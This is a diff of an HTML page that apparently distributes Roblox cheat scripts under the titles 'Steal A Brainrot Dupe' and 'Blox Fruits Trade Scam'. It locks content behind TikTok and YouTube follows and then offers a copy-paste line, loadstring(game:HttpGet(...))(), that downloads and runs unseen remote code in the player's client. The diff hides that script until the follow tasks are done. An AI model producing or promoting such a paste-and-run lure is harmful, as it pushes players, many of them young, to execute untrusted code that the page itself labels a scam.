@@ -31,6 +31,13 @@
     font-size: 24px;
     font-weight: bold;
     color: #4fd1ff;
+    user-select: none;
+  }
+
+  .dev-key {
+    cursor: pointer;
+    margin-right: 8px;
+    color: #facc15; /* bright yellow for visibility */
   }
 
   .subtitle {
@@ -116,13 +123,6 @@
     margin-top: 8px;
   }
 
-  .key {
-    text-align: center;
-    cursor: pointer;
-    font-size: 20px;
-    margin-top: 10px;
-  }
-
   .dev-panel {
     display: none;
     position: fixed;
@@ -155,6 +155,7 @@
     font-size: 11px;
     color: #94a3b8;
     margin-top: 10px;
+    user-select: none;
   }
 </style>
 </head>
@@ -163,7 +164,9 @@
 
 <!-- PAGE 1 -->
 <div class="card" id="page1">
-  <div class="title">🔑 Steal A Brainrot Dupe</div>
+  <div class="title">
+    <span class="dev-key" onclick="openDev()">🔑</span>Steal A Brainrot Dupe
+  </div>
   <div class="subtitle">Complete all steps to unlock</div>
 
   <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz')">📌 Follow TikTok</button>
@@ -191,20 +194,22 @@
   </div>
 
   <button class="task switch" onclick="switchPage()">Blox Fruits Trade Scam</button>
-  <div class="key" onclick="openDev()">🔑</div>
 </div>
 
 <!-- PAGE 2 -->
 <div class="card" id="page2" style="display:none">
-  <div class="title">🍎 Blox Fruits Trade Scam</div>
+  <div class="title">
+    <span class="dev-key" onclick="openDev()">🔑</span>🍎 Blox Fruits Trade Scam
+  </div>
 
-  <div class="script-box">
-    <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
-    <button class="copy" onclick="copyScript(this)">Copy</button>
+  <div class="scripts" id="bloxScripts" style="display:none;">
+    <div class="script-box">
+      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
+      <button class="copy" onclick="copyScript(this)">Copy</button>
+    </div>
   </div>
 
   <button class="task switch" onclick="switchPage()">Steal A Brainrot Dupe</button>
-  <div class="key" onclick="openDev()">🔑</div>
 </div>
 
 <!-- DEV PANEL -->
@@ -220,7 +225,8 @@
   <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
 </div>
 
-<div class="footer">Last updated: September 2026</div>
+<div class="footer">Last updated: September 2026<br>
+Credits: <a href="https://github.com/" target="_blank" style="color:#94a3b8;">GitHub</a> | <a href="https://www.tiktok.com/@void_scriptz" target="_blank" style="color:#94a3b8;">TikTok</a> | <a href="https://youtube.com/@xxxvoid_scriptzxxx" target="_blank" style="color:#94a3b8;">YouTube</a></div>
 
 <script>
   let done = 0, total = 5;
@@ -230,15 +236,22 @@
     btn.dataset.done = true;
     btn.style.opacity = .6;
     done++;
-    document.getElementById("bar").style.width = (done/total*100)+"%";
-    document.getElementById("percent").innerText = Math.floor(done/total*100)+"%";
-    if(done === total) document.getElementById("dupes").style.display = "block";
-    window.open(link,"_blank");
+    const percent = Math.floor((done / total) * 100);
+    document.getElementById("bar").style.width = percent + "%";
+    document.getElementById("percent").innerText = percent + "%";
+
+    if(done === total){
+      document.getElementById("dupes").style.display = "block";
+      document.getElementById("bloxScripts").style.display = "block";
+    }
+
+    window.open(link, "_blank");
   }
 
   function copyScript(btn){
     if(confirm("Use The Script In Second Sea Cafe Or It Won’t Work\n\nPress OK to confirm")){
       navigator.clipboard.writeText(btn.previousElementSibling.value);
+      alert("Copied!");
     }
   }
 
@@ -254,6 +267,7 @@
       document.getElementById("bar").style.width = "100%";
       document.getElementById("percent").innerText = "100%";
       document.getElementById("dupes").style.display = "block";
+      document.getElementById("bloxScripts").style.display = "block";
       dev.style.display = "block";
     }
   }
